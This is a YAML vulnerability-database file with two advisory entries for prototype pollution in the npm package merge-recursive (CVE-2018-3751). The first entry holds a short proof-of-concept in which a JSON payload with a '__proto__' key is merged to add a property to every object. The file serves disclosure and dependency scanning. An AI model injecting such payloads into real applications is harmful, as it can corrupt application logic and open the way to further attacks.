---
- id: npmjs:npm:merge-recursive:715
  title: Prototype Pollution
  description: |-
    All versions of `merge-recursive` are vulnerable to Prototype Pollution. When malicious user input is merged with another object it allows the attacker to modify the prototype of Object via `__proto__` causing the addition or modification of an existing property.

    Proof of concept:

    ```
    var merge = require('merge-recursive').recursive;
    var malicious_payload = '{"__proto__":{"oops":"It works !"}}';

    var a = {};
    console.log("Before : " + a.oops);
    merge({}, JSON.parse(malicious_payload));
    console.log("After : " + a.oops);
    ```
  affected_package: merge-recursive
  vulnerable_versions:
  - "<=99.999.99999"
  severity: low
  package_manager: npm
  cwe: CWE-471
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Olivier Arteau
  references: https://npmjs.com/advisories/715
  source_url: https://npmjs.com/advisories/715
- id: snykio:npm:merge-recursive:20180415
  title: Prototype Pollution
  description: |
    Affected versions of [merge-recursive][1] are vulnerable to Prototype
    Pollution. Utilities function in all the listed modules can be tricked
    into modifying the prototype of \"Object\" when the attacker control
    part of the structure passed to these function. This can let an attacker
    add or modify existing property that will exist on all object.



    [1]: https://www.npmjs.com/package/merge-recursive
  affected_package: merge-recursive
  vulnerable_versions:
  - "*"
  severity: low
  package_manager: npm
  cve:
  - CVE-2018-3751
  cwe:
  - CWE-400
  disclosed_date: 2018-04-15
  created_date: 2018-04-17
  last_modified_date: 2018-04-17
  credit:
  - Olivier Arteau
  references:
  - https://hackerone.com/reports/311337
  source_url: https://snyk.io/vuln/npm:merge-recursive:20180415
